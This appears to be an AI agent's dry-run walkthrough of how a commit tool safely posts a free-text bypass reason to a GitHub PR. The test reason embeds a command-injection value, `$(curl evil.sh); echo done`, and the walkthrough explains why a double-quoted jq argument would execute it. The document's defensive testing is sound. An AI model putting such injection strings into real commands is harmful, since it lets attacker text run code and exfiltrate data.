# DRY RUN — `commit --push --bypass-codex-review "tested via $(curl evil.sh); echo done"`

No git/gh/jq commands below are executed. This narrates exactly what `commit`'s step 16.5, following
`references/bypass-attestation-protocol.md`, would do — quoting the literal commands it would run.

## Context established before step 16.5(e)

- The push (step 16) already succeeded, `git push origin HEAD`.
- Step 16.5(a): reason is non-empty, so the flag is not rejected.
- Step 16.5(b): `gh pr view --json number,url,headRefOid,labels,isCrossRepository` resolved PR **#900**
  for the current branch. Not cross-repository. `headRefOid` matches `git rev-parse HEAD` — the SHA
  binding holds. `{owner}`/`{repo}` parsed from the PR's `url`.
- Step 16.5(c) — protocol step 1 (bot-trigger-mention check): the reason text
  `tested via $(curl evil.sh); echo done` is scanned for a literal bot-trigger mention
  (`@codex review`, `@codex full review`, `@coderabbitai review`, etc.). It contains none — `$(curl
  evil.sh)`, the semicolon, and `echo done` are shell metacharacters, not a bot-mention pattern — so
  this check passes and the flag is **not** rejected on this basis. (Whether this reason *should* be
  rejected as suspicious content is a separate judgment call the protocol leaves to human/agent
  discretion at step 5's report; it is not what step (a)/(c)'s bot-trigger check screens for.)
- Step 16.5(d) — protocol step 2: actor resolved via `gh api user --jq '.login'`, permission verified
  sufficient (`write`/`maintain`/`admin`) via
  `gh api repos/{owner}/{repo}/collaborators/{actor}/permission --jq '.permission'`. Given as sufficient
  per the prompt — proceed to (e).

## Step 16.5(e) — protocol step 3: "Build and post the attestation marker"

This is the step that actually transports the reason text into the posted PR comment. Walking through
it exactly as the protocol specifies:

### Why the reason is never composed into a Bash command string

The reason is free-text and, critically, **is never typed into a Bash command string at all — not even
as a quoted `jq --arg` value.** If it were composed as:

```bash
jq -n --arg reason "tested via $(curl evil.sh); echo done" --arg actor "$ACTOR" ...
```

the double quotes would **not** protect against this. Bash performs command substitution
(`$(...)`), backtick substitution, and `$VAR` expansion on the contents of a double-quoted string
*before* the resulting string is ever handed to `jq` as an argv element — quoting style controls word
splitting and globbing, not substitution. So this literal reason text, if ever assembled that way,
would cause bash to actually execute `curl evil.sh` as a real subprocess and splice its stdout into the
string in place of `$(curl evil.sh)` — a live command-injection / data-exfiltration primitive, using
attacker-controlled reason text as the vector. Single-quoting would suppress the expansion but isn't an
option here either, since the reason is dynamic content, not a fixed literal the model could hand-type
inside single quotes.

The protocol avoids this shape entirely — it never builds this command string in the first place,
regardless of quoting.

### (a) Write the reason to a scratchpad file

The reason text is written **verbatim** to a scratchpad file using the `Write` tool — not a Bash
heredoc or `echo`, which would itself require re-embedding the text in a shell command:

```
Write("/tmp/claude-scratch/.../bypass-reason.txt", "tested via $(curl evil.sh); echo done")
```

`Write` places the exact byte content of the string into the file with no shell interpretation
whatsoever — no parser ever looks at `$(curl evil.sh)` as syntax to evaluate. It lands in the file as
39 literal characters, indistinguishable from any other plain text.

### (b) Build the JSON marker with `jq -n --rawfile`

The marker is built by reading that file back with `--rawfile`, never `--arg`, for the reason field:

```bash
jq -n --rawfile reason /tmp/claude-scratch/.../bypass-reason.txt \
      --arg actor "octocat" \
      --arg head_sha "a1b2c3d4e5f6..." \
      --arg created_at "2026-09-21T00:00:00Z" \
      '{schema_version: 1, actor: $actor, head_sha: $head_sha, reason: $reason, created_at: $created_at}' \
      > /tmp/claude-scratch/.../marker.json
```

`--rawfile reason <path>` tells `jq` to read that file's raw content directly as a string value — this
is a filesystem read performed by `jq` itself, not a shell substitution. The **path** is the only thing
that appears in the Bash command line; the reason's actual content never does. Bash only ever parses the
path string (a safe, structurally-constrained scratchpad path with no attacker-influenced characters);
it has nothing to expand, since `$(curl evil.sh)` never appears as text in the command bash itself
parses.

`actor`, `head_sha`, and `created_at` are structurally-constrained, non-free-text values (a GitHub
login, a 40-hex-char SHA, an ISO-8601 timestamp) and are safe to pass via ordinary `--arg`, as the
protocol states — that's a different data class from the free-text `reason`, and is not what's being
tested here.

**The resulting `reason` field in the marker JSON is the literal, unexpanded string:**

```json
"reason": "tested via $(curl evil.sh); echo done"
```

Not the output of running `curl evil.sh`. Not a truncated or re-interpreted string. `--rawfile` performs
no shell evaluation of the file's bytes — it is a raw slurp, so whatever went into the file in step (a)
comes out character-for-character in step (b). No subprocess named `curl` is ever spawned, and no `echo`
ever runs — those tokens exist only as inert text inside a JSON string value.

### (c) Write the comment body and post it

The marker is wrapped in an HTML comment and written to a second scratchpad file:

```
Write("/tmp/claude-scratch/.../comment-body.md",
"<!-- marketplace-ci-bypass-attestation {\"schema_version\":1,\"actor\":\"octocat\",\"head_sha\":\"a1b2c3d4e5f6...\",\"reason\":\"tested via $(curl evil.sh); echo done\",\"created_at\":\"2026-09-21T00:00:00Z\"} -->")
```

(In practice this file's content is produced from `marker.json`'s own output rather than hand-typed —
shown inline here only to make the final comment body explicit.)

Then posted against the already-resolved PR number, using `--body-file`, never the argument-less form
and never an inline `--body <text>`:

```bash
gh pr comment 900 --body-file /tmp/claude-scratch/.../comment-body.md
```

Again, only a **path** appears on the command line — the reason's actual content is never an argument to
`gh`, never interpolated into the command string, and never passed through a shell that could expand it.
`gh pr comment` reads the file's bytes directly and POSTs them as the comment body via the GitHub API.

### Net result

The PR comment that lands on #900 contains the literal text `$(curl evil.sh)` as a harmless string
inside the HTML-comment-wrapped JSON marker — visible to a human reader exactly as typed, never executed.
No shell at any point in this pipeline (`Write`, `jq -n --rawfile`, `gh pr comment --body-file`) ever
parses the reason's content as command syntax, because none of these three tool invocations puts the
reason's bytes into a position where a shell would interpret them — the reason only ever exists as file
content or as a JSON string value, never as text inside a command line bash itself tokenizes.

Step (e) then proceeds to step 16.5(f) (protocol step 4: verify/apply/re-apply the
`s: codex review bypassed` label) and 16.5(g) (protocol step 5: report the outcome) — out of scope for
this walkthrough, which was scoped to step (e) only.
